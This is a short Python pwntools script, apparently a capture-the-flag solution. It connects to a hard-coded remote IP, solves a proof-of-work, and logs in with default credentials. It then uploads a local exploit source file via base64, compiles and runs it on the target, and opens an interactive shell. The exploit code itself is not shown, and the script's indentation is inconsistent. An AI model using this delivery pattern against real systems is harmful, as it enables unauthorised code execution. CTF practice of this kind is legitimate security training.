from pwn import *
import base64

context.log_level = 'warning'

r = remote("207.154.246.93", 13370)

def pow_solve():
	r.recvuntil(b'unhex("')

	num = r.recvline().split(b'"')[0]

	print(f"[*] Retrieved num: {num}")

	result = subprocess.run(
	    ["./pow-solver", "30", num.decode()], 
	    capture_output=True, 
	    text=True
	)

    if result.returncode == 0:
        pow_result = result.stdout.strip()
        print(f"[*] Result: {pow_result}")
    else:
        print(f"Error: {result.stderr}")
        sys.exit(1)

    print(f"[+] Sending {pow_result.encode()}")
    r.sendline(pow_result.encode())

pow_solve()

print(f"[*] Proof-of-Work solved! Sending exploit...")

r.recvuntil(b'login: ')
r.sendline(b'hxp')
r.recvuntil(b'Password: ')
r.sendline(b'hxp')

with open("marc.c", "rb") as f:
	data = f.read()
	out = base64.b64encode(data).decode('utf-8')
	r.sendlineafter(b'$', f'echo "{out}" | base64 -d > /tmp/main.c'.encode())
	f.close()

r.sendlineafter(b'$', b'gcc /tmp/main.c -o /tmp/win')
r.sendlineafter(b'$', b'/tmp/win')

r.interactive()